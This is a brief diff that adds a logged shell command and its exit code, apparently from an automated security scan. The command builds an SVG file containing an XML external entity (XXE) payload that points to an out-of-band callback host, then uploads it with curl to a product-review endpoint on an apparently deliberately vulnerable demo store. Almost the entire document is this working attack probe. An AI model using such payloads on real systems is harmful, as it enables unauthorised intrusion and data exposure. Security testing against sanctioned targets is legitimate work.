@@ -1,0 +1,4 @@
+# command: timeout 20 sh -c 'printf '"'"'%s'"'"' '"'"'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://oob701de1e6f584.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/svg">]><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">&xxe;</svg>'"'"' > /tmp/xxedoc_$$.svg; curl -s -m 18 -o /dev/null -F '"'"'limit=@/tmp/xxedoc_$$.svg;type=image/svg+xml'"'"' https://duck-store.escape.tech/api/v1/reviews/product/1'
+# exit_code: 26
+# ---
+
